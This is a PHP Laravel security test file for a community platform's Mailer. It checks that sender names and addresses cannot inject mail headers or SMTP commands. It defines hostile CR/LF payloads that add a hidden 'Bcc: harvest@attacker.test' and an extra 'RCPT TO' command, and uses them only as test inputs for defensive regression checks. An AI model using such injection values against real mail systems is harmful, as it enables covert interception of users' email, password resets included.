<?php
// Copyright © 2024–2026 Jasper Ford
// SPDX-License-Identifier: AGPL-3.0-or-later
// Author: Jasper Ford
// See NOTICE file for attribution and acknowledgements.

namespace Tests\Laravel\Feature\Security;

use App\Core\Mailer;
use App\Core\TenantContext;
use App\Models\EmailSettings;
use App\Models\User;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\DB;
use Laravel\Sanctum\Sanctum;
use ReflectionClass;
use ReflectionMethod;
use ReflectionProperty;
use Tests\Laravel\TestCase;

/**
 * F-280 (E-062): a community's sender name must not be able to add mail
 * headers — a hidden Bcc: on every email the community sends, password resets
 * included.
 *
 * Mailer::send() already stripped CR/LF from To, Subject, Cc and Reply-To, and
 * withFromName() stripped them from an explicit override. The From name and
 * address loaded from the community's own record and email settings did not
 * pass through that guard, and both hand-built header blocks (Gmail API MIME
 * and the SMTP DATA phase) interpolated them verbatim. The admin endpoint
 * that stores those settings checked the setting NAME, never the value.
 *
 * Nothing here sends mail: the Gmail MIME message is built in memory, and the
 * SMTP conversation runs over a local socket pair with canned replies.
 */
class MailerHeaderInjectionTest extends TestCase
{
    use DatabaseTransactions;

    /** A line break followed by headers the platform never meant to send. */
    private const HOSTILE_NAME = "Community Support\r\nBcc: harvest@attacker.test\r\nX-Injected: yes";

    /** @var array<int,resource> */
    private array $pair = [];

    protected function tearDown(): void
    {
        foreach ($this->pair as $end) {
            if (is_resource($end)) {
                fclose($end);
            }
        }
        TenantContext::reset();
        parent::tearDown();
    }

    private function newTenant(string $name): int
    {
        return (int) DB::table('tenants')->insertGetId([
            'name' => $name,
            'slug' => 'f280-' . bin2hex(random_bytes(4)),
            'created_at' => now(),
            'updated_at' => now(),
        ]);
    }

    private function mailerFor(int $tenantId): Mailer
    {
        TenantContext::setById($tenantId);

        return new Mailer($tenantId);
    }

    /** Header block of the Gmail API MIME message (everything before the first blank line). */
    private function gmailHeaders(Mailer $mailer, string $subject = 'Notice', ?string $replyTo = null): string
    {
        $m = new ReflectionMethod(Mailer::class, 'buildRawEmail');
        $m->setAccessible(true);
        $raw = (string) $m->invoke($mailer, 'member@example.test', $subject, '<p>body</p>', null, $replyTo);
        $end = strpos($raw, "\r\n\r\n");

        return $end === false ? $raw : substr($raw, 0, $end);
    }

    /** Everything the SMTP client writes to the server for one message. */
    private function smtpWire(Mailer $mailer): string
    {
        $pair = stream_socket_pair(STREAM_PF_UNIX, STREAM_SOCK_STREAM, STREAM_IPPROTO_IP);
        $this->assertIsArray($pair);
        $this->pair = $pair;
        [$client, $server] = $pair;

        // MAIL FROM, RCPT TO, DATA, end-of-data.
        fwrite($server, "250 OK\r\n250 OK\r\n354 Go ahead\r\n250 Queued\r\n");

        $ref = new ReflectionClass($mailer);
        $ref->getProperty('socket')->setValue($mailer, $client);
        $ref->getProperty('timeout')->setValue($mailer, 2);
        stream_set_timeout($client, 2);
        $ref->getMethod('sendData')->invoke($mailer, 'member@example.test', 'Notice', '<p>body</p>');

        stream_set_blocking($server, false);
        $wire = '';
        while (($chunk = fread($server, 65536)) !== false && $chunk !== '') {
            $wire .= $chunk;
        }

        return $wire;
    }

    private function smtpHeaders(string $wire): string
    {
        $data = substr($wire, (int) strpos($wire, "DATA\r\n") + strlen("DATA\r\n"));
        $end = strpos($data, "\r\n\r\n");

        return $end === false ? $data : substr($data, 0, $end);
    }

    private function fromName(Mailer $mailer): string
    {
        $p = new ReflectionProperty(Mailer::class, 'fromName');
        $p->setAccessible(true);

        return (string) $p->getValue($mailer);
    }

    private function assertNoInjectedHeader(string $headers): void
    {
        $this->assertDoesNotMatchRegularExpression('/^Bcc:/mi', $headers, 'a Bcc header was injected');
        $this->assertDoesNotMatchRegularExpression('/^X-Injected:/mi', $headers, 'an arbitrary header was injected');
        $this->assertSame(1, preg_match_all('/^From: /m', $headers), 'exactly one From header');
    }

    // -----------------------------------------------------------------
    // Gmail API path
    // -----------------------------------------------------------------

    public function test_gmail_a_community_name_with_a_line_break_cannot_add_headers(): void
    {
        $mailer = $this->mailerFor($this->newTenant(self::HOSTILE_NAME));

        $this->assertStringNotContainsString("\n", $this->fromName($mailer));
        $this->assertStringNotContainsString("\r", $this->fromName($mailer));
        $this->assertNoInjectedHeader($this->gmailHeaders($mailer));
    }

    public function test_gmail_the_sender_name_setting_cannot_add_headers(): void
    {
        $tenantId = $this->newTenant('F280 Clean Community');
        EmailSettings::setMultiple($tenantId, [
            'email_provider' => 'gmail_api',
            'gmail_client_id' => 'client-id',
            'gmail_client_secret' => 'client-secret',
            'gmail_refresh_token' => 'refresh-token',
            'gmail_sender_email' => "noreply@example.test\r\nBcc: harvest@attacker.test",
            'gmail_sender_name' => self::HOSTILE_NAME,
        ]);

        $mailer = $this->mailerFor($tenantId);
        $this->assertSame('gmail_api', $mailer->getProviderType());
        $this->assertNoInjectedHeader($this->gmailHeaders($mailer));
    }

    // -----------------------------------------------------------------
    // SMTP path
    // -----------------------------------------------------------------

    public function test_smtp_the_from_name_setting_cannot_add_headers(): void
    {
        $tenantId = $this->newTenant('F280 Clean Community');
        EmailSettings::setMultiple($tenantId, [
            'email_provider' => 'smtp',
            'smtp_host' => 'smtp.example.test',
            'smtp_user' => 'u',
            'smtp_password' => 'p',
            'smtp_from_email' => 'noreply@example.test',
            'smtp_from_name' => self::HOSTILE_NAME,
        ]);

        $mailer = $this->mailerFor($tenantId);
        $this->assertSame('smtp', $mailer->getProviderType());
        $this->assertNoInjectedHeader($this->smtpHeaders($this->smtpWire($mailer)));
    }

    public function test_smtp_the_from_address_setting_cannot_add_commands_or_headers(): void
    {
        $tenantId = $this->newTenant('F280 Clean Community');
        EmailSettings::setMultiple($tenantId, [
            'email_provider' => 'smtp',
            'smtp_host' => 'smtp.example.test',
            'smtp_user' => 'u',
            'smtp_password' => 'p',
            // Used in the MAIL FROM command as well as the From header.
            'smtp_from_email' => "noreply@example.test>\r\nRCPT TO:<harvest@attacker.test>\r\nBcc: harvest@attacker.test",
            'smtp_from_name' => 'Community Support',
        ]);

        $wire = $this->smtpWire($this->mailerFor($tenantId));

        $this->assertDoesNotMatchRegularExpression('/^RCPT TO:\s*<harvest@attacker\.test>/mi', $wire, 'an extra SMTP recipient was injected');
        $this->assertSame(1, preg_match_all('/^RCPT TO:/m', $wire), 'exactly one recipient command');
        $this->assertNoInjectedHeader($this->smtpHeaders($wire));
    }

    // -----------------------------------------------------------------
    // Platform (Postmark) default — the name reaches the JSON From field
    // -----------------------------------------------------------------

    public function test_platform_default_from_name_is_single_line(): void
    {
        config([
            'mail.gmail_api.enabled' => false,
            'mail.platform_provider' => 'postmark',
            'mail.postmark.server_token' => 'x',
            'mail.postmark.from_name' => self::HOSTILE_NAME,
        ]);
        $mailer = new Mailer();
        $this->assertSame('postmark', $mailer->getProviderType());

        $this->assertStringNotContainsString("\n", $this->fromName($mailer));
        $this->assertStringNotContainsString("\r", $this->fromName($mailer));
    }

    // -----------------------------------------------------------------
    // Controls — legitimate values are unchanged
    // -----------------------------------------------------------------

    public function test_control_an_ordinary_sender_name_is_used_verbatim_on_both_paths(): void
    {
        $tenantId = $this->newTenant('F280 Clean Community');
        EmailSettings::setMultiple($tenantId, [
            'email_provider' => 'smtp',
            'smtp_host' => 'smtp.example.test',
            'smtp_user' => 'u',
            'smtp_password' => 'p',
            'smtp_from_email' => 'noreply@example.test',
            'smtp_from_name' => "Hour Timebank — O'Brien Street",
        ]);
        $mailer = $this->mailerFor($tenantId);

        $smtp = $this->smtpHeaders($this->smtpWire($mailer));
        $this->assertStringContainsString("From: Hour Timebank — O'Brien Street <noreply@example.test>\r\n", $smtp . "\r\n");
        $this->assertStringContainsString("From: Hour Timebank — O'Brien Street <noreply@example.test>", $this->gmailHeaders($mailer));
        $this->assertStringContainsString("\r\nMAIL FROM: <noreply@example.test>\r\n", "\r\n" . $this->smtpWire($mailer));
    }

    public function test_control_subject_and_reply_to_still_cannot_inject(): void
    {
        $mailer = $this->mailerFor($this->newTenant('F280 Clean Community'));

        $sanitize = new ReflectionMethod(Mailer::class, 'sanitizeHeaderValue');
        $sanitize->setAccessible(true);
        foreach (["reply@example.test\r\nBcc: harvest@attacker.test", "Notice\nBcc: harvest@attacker.test", "a\x0bb\x0cc\u{2028}d\u{0085}e"] as $hostile) {
            $clean = (string) $sanitize->invoke(null, $hostile);
            $this->assertDoesNotMatchRegularExpression('/[\x00-\x08\x0A-\x1F\x7F]/', $clean);
            $this->assertDoesNotMatchRegularExpression('/[\x{0085}\x{2028}\x{2029}]/u', $clean);
        }

        $headers = $this->gmailHeaders($mailer, "Notice\r\nBcc: harvest@attacker.test", 'reply@example.test');
        $this->assertNoInjectedHeader($headers);
        $this->assertStringContainsString('Reply-To: reply@example.test', $headers);
    }

    // -----------------------------------------------------------------
    // The admin write path refuses the value outright
    // -----------------------------------------------------------------

    public function test_admin_settings_refuse_a_sender_name_or_address_with_a_line_break(): void
    {
        $admin = User::factory()->forTenant($this->testTenantId)->admin()->create();
        Sanctum::actingAs($admin);

        foreach (['smtp_from_name', 'gmail_sender_name', 'smtp_from_email', 'gmail_sender_email'] as $key) {
            $value = str_ends_with($key, '_email') ? "noreply@example.test\r\nBcc: harvest@attacker.test" : self::HOSTILE_NAME;
            $response = $this->apiPut('/v2/admin/email/config', [$key => $value]);

            $response->assertStatus(422);
            $response->assertJsonPath('errors.0.field', $key);
            $response->assertJsonPath('errors.0.message', 'The sender name and sender email address cannot contain line breaks or other control characters.');
            $this->assertNull(EmailSettings::get($this->testTenantId, $key), "{$key} must not be stored");
        }
    }

    public function test_control_admin_settings_accept_an_ordinary_sender_name(): void
    {
        $admin = User::factory()->forTenant($this->testTenantId)->admin()->create();
        Sanctum::actingAs($admin);

        $response = $this->apiPut('/v2/admin/email/config', [
            'smtp_from_name' => "Hour Timebank — O'Brien Street",
            'smtp_from_email' => 'noreply@example.test',
        ]);

        $response->assertStatus(200);
        $this->assertSame("Hour Timebank — O'Brien Street", EmailSettings::get($this->testTenantId, 'smtp_from_name'));
    }

    public function test_control_a_member_cannot_write_email_settings(): void
    {
        $member = User::factory()->forTenant($this->testTenantId)->create();
        Sanctum::actingAs($member);

        $this->apiPut('/v2/admin/email/config', ['smtp_from_name' => 'Anything'])->assertStatus(403);
    }
}
